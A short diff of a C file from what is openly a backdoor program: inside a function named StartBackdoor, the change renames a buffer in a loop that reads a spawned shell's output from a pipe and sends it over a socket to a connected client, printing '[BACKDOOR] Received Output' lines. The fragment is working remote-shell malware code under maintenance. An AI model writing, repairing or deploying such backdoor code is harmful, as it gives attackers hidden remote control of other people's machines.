@@ -105,17 +105,19 @@ BOOL StartBackdoor(void) {
 
 CLEANUP:
     // 8. Read Output from Pipe (Safe Loop)
-    char outputBuf[4096];
+    // FIX: Remove unused outputBuf, use currentBuf consistently
+    char currentBuf[4096]; // Use same buffer for output and current read
     while (stillRunning) {
-        memset(outputBuf, 0, sizeof(outputBuf));
+        // Initialize buffer
+        memset(currentBuf, 0, sizeof(currentBuf));
         DWORD bytesRead = 0;
-        BOOL success = ReadFile(hReadPipe, outputBuf, sizeof(outputBuf) - 1, &bytesRead, NULL);
+        BOOL success = ReadFile(hReadPipe, currentBuf, sizeof(currentBuf) - 1, &bytesRead, NULL);
 
         if (success) {
             if (bytesRead > 0) {
                 // Send output to client
-                send(client, outputBuf, bytesRead, 0);
-                printf("[BACKDOOR] Received Output: %.*s\n", (int)bytesRead, outputBuf);
+                send(client, currentBuf, bytesRead, 0);
+                printf("[BACKDOOR] Received Output: %.*s\n", (int)bytesRead, currentBuf);
                 fflush(stdout);
 
                 // Check if shell exited (EOF)
